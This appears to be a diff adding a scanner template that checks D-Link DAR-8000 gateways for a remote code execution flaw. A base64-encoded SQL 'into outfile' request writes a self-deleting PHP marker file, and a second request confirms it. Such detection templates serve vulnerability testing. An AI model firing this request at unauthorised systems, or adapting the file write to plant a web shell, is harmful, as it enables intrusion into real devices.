@@ -1,0 +1,35 @@
+id: dlink-dar-8000-rce
+
+info:
+  name: D-Link DAR-8000 远程命令执行漏洞
+  author: SleepingBag945
+  severity: critical
+  description: |
+    D-Link DAR上网行为审计网关可以为企业提供完善的互联网访问行为管理解决方案，全面保护企业的运营效率和信息安全。DAR系列产品提供全面的应用识别和控制能力、精细化的应用层带宽管理能力、分类化的海量URL过滤能力、详尽的上网行为审计能力以及丰富的上网行为报表，从而帮助企业快速构建可视化、低成本以及高效安全的商业网络。D-Link上网行为管理系统存在远程代码执行漏洞，攻击者通过漏洞可以获取服务器权限。
+    mask.style.visibility && title="D-Link"
+  reference:
+    - https://mp.weixin.qq.com/s/1iEvtvHJncuYJ316byyf6g
+  tags: dlink
+
+http:
+  - raw:
+      - |              
+        GET /importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDZkNjQzNTI4MzIzMzMzMjkzYjc1NmU2YzY5NmU2YjI4NWY1ZjQ2NDk0YzQ1NWY1ZjI5M2IzZjNlIGludG8gb3V0ZmlsZSAnL3Vzci9oZGRvY3MvbnNnL2FwcC90YW1lLnBocCcg HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=8d3887c7a401d2f1bc1a58631fcfa6e7
+        Accept: text/html, application/xhtml+xml, image/jxr, */*
+        Accept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-IE;q=0.6,en-US;q=0.4,en;q=0.2
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko
+        Accept-Encoding: gzip, deflate
+      
+      - |
+        GET /app/tame.php HTTP/1.1
+        Host: {{Hostname}}
+           
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1==200
+          - status_code_2==200 && contains(body_2,"e165421110ba03099a1c0393373c5b43")
+        condition: and
